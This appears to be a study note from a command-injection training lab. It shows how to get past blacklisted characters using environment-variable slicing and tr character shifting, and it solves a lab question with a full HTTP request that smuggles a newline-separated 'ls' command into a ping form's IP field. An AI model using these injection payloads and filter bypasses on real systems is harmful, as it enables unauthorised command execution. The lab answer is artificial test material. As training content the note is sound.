# Bypassing Other Blacklisted Characters
## Linux
Cut environment variables for the desired character:
- `${PATH:0:1}` = `/`
- `${LS_COLORS:10:1}` = `;`

## Windows
The same concept works on Windows as well:
- `%HOMEPATH:~6,-11%` = `\`
- `$env:HOMEPATH[0]` = `\`
- `$env:PROGRAMFILES[10]` = ` `

## Character Shifting
For example, the following Linux command shifts the character we pass by `1`. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[` in the below example. This way, the last printed character would be the one we need:

```sh
$ man ascii     # \ is on 92, before it is [ on 91
$ echo $(tr '!-}' '"-~'<<<[)
\
$ echo $(tr '!-}' '"-~'<<< ':')
;
```

## Questions
1. Use what you learned in this section to find name of the user in the '/home' folder. What user did you find? **Answer:**
   - Use the new-line character with the Linux bypass:
        ```
        POST / HTTP/1.1
        Host: 154.57.164.81:32341
        Content-Length: 36
        Cache-Control: max-age=0
        Accept-Language: en-US,en;q=0.9
        Origin: http://154.57.164.81:32341
        Content-Type: application/x-www-form-urlencoded
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Referer: http://154.57.164.81:32341/
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive

        ip=0.0.0.0%0als${IFS}${PATH:0:1}home
        ```
        ```html
        <pre>
        PING 0.0.0.0 (127.0.0.1) 56(84) bytes of data.
        64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.045 ms

        --- 0.0.0.0 ping statistics ---
        1 packets transmitted, 1 received, 0% packet loss, time 0ms
        rtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms
        1nj3c70r
        </pre>
        ```